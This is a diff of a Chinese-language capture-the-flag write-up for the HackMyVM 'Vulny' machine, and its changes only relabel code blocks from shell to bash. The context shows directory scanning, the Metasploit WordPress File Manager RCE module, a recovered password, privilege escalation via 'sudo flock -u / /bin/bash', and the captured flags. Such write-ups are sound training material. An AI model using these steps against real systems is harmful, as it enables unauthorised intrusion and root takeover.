@@ -54,7 +54,7 @@ Network Distance: 1 hop
 
 ## 探测 web 服务
 
-```shell
+```bash
 ┌─[✗]─[randark@randark-Parrot]─[~/tmp/HackMyVM-Vulny]
 └──╼ $dirsearch -u http://192.168.56.109/secret/
 
@@ -98,7 +98,7 @@ Target: http://192.168.56.109/
 
 进一步扫描
 
-```shell
+```bash
 ┌─[✗]─[randark@randark-Parrot]─[~/tmp/HackMyVM-Vulny]
 └──╼ $dirsearch -u http://192.168.56.109/secret/
 
@@ -167,7 +167,7 @@ Target: http://192.168.56.109/secret/
 
 直接使用 msfconsole 一把梭
 
-```shell
+```bash
 [msf](Jobs:0 Agents:0) exploit(multi/http/wp_file_manager_rce) >> set ForceExploit true
 ForceExploit => true
 [msf](Jobs:0 Agents:0) exploit(multi/http/wp_file_manager_rce) >> show options
@@ -309,7 +309,7 @@ idrinksomewater
 adrian:idrinksomewater
 ```
 
-```shell
+```bash
 (remote) www-data@vulny:/usr/share/wordpress/wp-content/plugins/wp-file-manager/lib/files$ su adrian
 Password:
 adrian@vulny:/usr/share/wordpress/wp-content/plugins/wp-file-manager/lib/files$ whoami
@@ -320,7 +320,7 @@ adrian
 
 ## user pwned
 
-```shell
+```bash
 adrian@vulny:~$ cat user.txt
 HMViuploadfiles
 ```
@@ -379,7 +379,7 @@ User adrian may run the following commands on vulny:
 
 ## 尝试提权
 
-```shell
+```bash
 adrian@vulny:~$ sudo flock -u / /bin/bash
 root@vulny:/home/adrian# whoami
 root
@@ -387,7 +387,7 @@ root
 
 ## root pwned
 
-```shell
+```bash
 root@vulny:~# cat root.txt
 HMVididit
 ```
